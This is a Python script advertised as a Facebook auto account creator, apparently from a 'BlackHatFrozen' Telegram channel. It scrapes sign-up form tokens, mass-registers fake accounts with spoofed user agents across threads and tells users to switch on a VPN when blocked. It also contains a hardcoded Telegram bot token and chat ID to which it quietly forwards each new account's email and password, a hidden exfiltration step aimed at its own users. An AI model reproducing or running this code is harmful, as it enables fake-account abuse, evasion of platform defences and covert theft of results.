import requests,os
print('\n Installing the tool offices. Wait...')
os.system('pip install fake-useragent pip install random pip install threading')
from bs4 import BeautifulSoup
import random
from fake_useragent import UserAgent
import threading
from rich.panel import Panel as nel
from rich import print as cetak
os.system('clear')
S='\033[30m' 
F='\033[31m'   
A='\033[32m' 
T='\033[33m'
M='\033[34m' 
N='\033[35m'
Z='\033[36m' 
B='\033[37m' 
H='\033[91m'  
ua = UserAgent()
user_agent = ua.random
cetak(nel('\t\t\tFᴀᴄᴇʙᴏᴏᴋ Aᴜᴛᴏ Aᴄᴄᴏᴜɴᴛ Cʀᴇᴀᴛᴏʀ ♥️',style='green'))
print('\n\n')
cetak(nel(' Cʜᴀɴɴᴇʟ:- @BlackHatFrozen ',style='blue',title='TOKEN'))
token = input('- Token •~ ')
print('\n\n')
cetak(nel('Cʀᴇᴀᴛᴇᴅ Bʏ:- @princemodder',style='yellow',title='ID'))
ID = input('- ID •~ ')
metoken = '7192995286:AAF6pbAoU8GmApTY_tPsVOHs_QvmoMz90HA'
meID = '7115404052'
class kilvip():
    def __init__(self):
        self.done = False
        self.cookies = {
            "lsd": "","jazoest": "", "ccp": "","reg_instance": "","submission_request": "","reg_impression_id": ""
        };self.password = "".join(random.choice("1234567890qpwoeirutyalskdjfhgmznxbcv") for _ in range(10))
        self.email = random.choice('klxjxjwa')+"".join(random.choice("1234567890qpwoeirutyalskdjfhgmznxbcv") for _ in range(15));self.Name = "sajad";self.Name2 = "bro";self.admin()
    def admin(self):

        print("\nWᴇ Aʀᴇ Cʀᴇᴀᴛɪɴɢ A Fᴀᴄᴇʙᴏᴏᴋ Aᴄᴄᴏᴜɴᴛ Fᴏʀ Yᴏᴜ. Pʟᴇᴀsᴇ Wᴀɪᴛ....");self.get_cookies()
        print("");self.register()
    def get_cookies(self):
        url = "https://mbasic.facebook.com/reg/?cid=103&refsrc=deprecated&_rdr"
        r = requests.get(url)
        soup = BeautifulSoup(r.text, 'html.parser')
        lsd = soup.select_one('input[name=lsd]')['value']
        jazoest = soup.select_one('input[name=jazoest]')['value']
        ccp = soup.select_one('input[name=ccp]')['value']
        reg_instance = soup.select_one('input[name=reg_instance]')['value']
        submission_request = soup.select_one('input[name=submission_request]')['value']
        reg_impression_id = soup.select_one('input[name=reg_impression_id]')['value']
        self.cookies['lsd'] = lsd
        self.cookies['jazoest'] = jazoest
        self.cookies['ccp'] = ccp
        self.cookies['reg_instance'] = reg_instance
        self.cookies['submission_request'] = submission_request
        self.cookies['reg_impression_id'] = reg_impression_id

    def register(self):
        url = "https://mbasic.facebook.com/reg/submit/?cid=103";headers = {"Host": "mbasic.facebook.com","Cookie": f"datr={self.cookies['reg_instance']}","User-Agent": user_agent,
 "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",  "Accept-Language": "en-US,en;q=0.5","Referer": "https://mbasic.facebook.com/reg/?cid=103&refsrc=deprecated&_rdr","Content-Type": "application/x-www-form-urlencoded", "Content-Length": "547","Origin": "https://mbasic.facebook.com","Dnt": "1","Upgrade-Insecure-Requests": "1","Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Site": "same-origin","Sec-Fetch-User": "?1","Te": "trailers"};data = f"lsd={self.cookies['lsd']}&jazoest={self.cookies['jazoest']}&ccp={self.cookies['ccp']}&reg_instance={self.cookies['reg_instance']}&submission_request={self.cookies['submission_request']}&helper=&reg_impression_id={self.cookies['reg_impression_id']}&ns=0&zero_header_af_client=&app_id=&logger_id=&field_names%5B%5D=firstname&field_names%5B%5D=reg_email__&field_names%5B%5D=sex&field_names%5B%5D=birthday_wrapper&field_names%5B%5D=reg_passwd__&firstname={self.Name}&lastname={self.Name2}&reg_email__={self.email}%40gmail.com&sex=2&custom_gender=&did_use_age=false&birthday_month=9&birthday_day=5&birthday_year=1990&age_step_input=&reg_passwd__={self.password}&submit=Sign+Up";r = requests.post(url,headers=headers,data=data)
        if 'take you through a few steps to confirm your account on Facebook' in r.text:

        	kilacc = f'''
• Yᴏᴜʀ Fᴀᴄᴇʙᴏᴏᴋ ᴀᴄᴄᴏᴜɴᴛ ʜᴀs ʙᴇᴇɴ ᴄʀᴇᴀᴛᴇᴅ Sᴜᴄᴄᴇssғᴜʟʟʏ ❤️‍🔥
        	
••••••••••••••••••••••••••••••••••

• Eᴍᴀɪʟ : {self.email} > 

• Pᴀssᴡᴏʀᴅ : {self.password} > 

• UsᴇʀAɢᴇɴᴛ : {user_agent} > 

••••••••••••••••••••••••••••••••••

• Cʜᴀɴɴᴇʟ: @BlackHatFrozen 
        	'''
        	requests.get('https://api.telegram.org/bot' + str(token) + '/sendMessage?chat_id=' + str(ID) + '&text=' + str(kilacc))
        	requests.get('https://api.telegram.org/bot' + str(metoken) + '/sendMessage?chat_id=' + str(meID) + '&text=' + str(kilacc))
        	kipo = nel(kilacc,style='green')
        	cetak(nel(kipo,title='ɴᴇᴡ ᴀᴄᴄᴏᴜɴᴛ',style='red'))
        	
        elif 'There was an error with your registration. Please try registering again.' in r.text:
            print(' There is an error run vpn and trying again  .. ')
            exit()
        else:
            try:
            	kilacc = f'''
        	Yᴏᴜʀ Fᴀᴄᴇʙᴏᴏᴋ ᴀᴄᴄᴏᴜɴᴛ ʜᴀs ʙᴇᴇɴ ᴄʀᴇᴀᴛᴇᴅ Sᴜᴄᴄᴇssғᴜʟʟʏ ❤️‍🔥
        	
••••••••••••••••••••••••••••••••••
• Eᴍᴀɪʟ : {self.email}
• Pᴀssᴡᴏʀᴅ : {self.password}
••••••••••••••••••••••••••••••••••

Cᴏᴏᴋɪᴇs : {self.get_cookies}

••••••••••••••••••••••••••••••••••

Cʜᴀɴɴᴇʟ : @BlackHatFrozen 
        	'''
            	requests.get('https://api.telegram.org/bot' + str(token) + '/sendMessage?chat_id=' + str(ID) + '&text=' + str(kilacc))
            	
            	cetak(nel(kilacc,style='green'))
            except:
                input(" Turn on the Vpn and start the tool again  ")
                exit()


Threads=[] 
for t in range(5):
 x = threading.Thread(target=kilvip)
 x.start()
 Threads.append(x)
for Th in Threads:
 Th.join()
